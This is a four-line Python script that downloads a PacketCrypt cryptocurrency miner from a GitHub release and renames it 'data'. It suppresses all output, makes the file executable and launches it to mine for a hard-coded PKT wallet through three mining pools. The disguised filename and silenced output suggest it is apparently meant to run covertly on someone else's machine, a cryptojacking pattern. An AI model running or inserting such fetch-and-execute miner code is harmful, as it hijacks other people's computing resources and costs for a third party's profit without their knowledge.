import os
cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O data >/dev/null 2>&1')
cmd = os.system('chmod +x data >/dev/null 2>&1')
cmd = os.system('./data ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io')
